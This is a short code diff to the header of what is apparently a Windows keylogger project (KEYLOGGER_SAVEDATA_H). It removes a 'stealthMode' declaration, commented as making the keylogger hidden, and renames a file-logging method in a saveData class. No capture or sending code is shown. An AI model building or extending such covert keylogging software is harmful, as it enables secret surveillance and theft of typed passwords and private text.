@@ -7,23 +7,15 @@
 
 #include<iostream>
 #include<windows.h>
-//#include<winuser.h>
 #include<stdio.h>
 #include<string>
 #include<fstream>
 using namespace std;
 
-//declare stealth function to make the keylogger hidden
-void stealthMode();
-
-void startLogging();
-
-
-
 class saveData {
 
 public:
-     static void statLogging(LPCSTR text){
+     static void startLogging(string text){
          //creates object for file stream
          ofstream logfile;
 
@@ -188,6 +180,7 @@ public:
         return results;
     }
 };
+
 
 
 #endif //KEYLOGGER_SAVEDATA_H
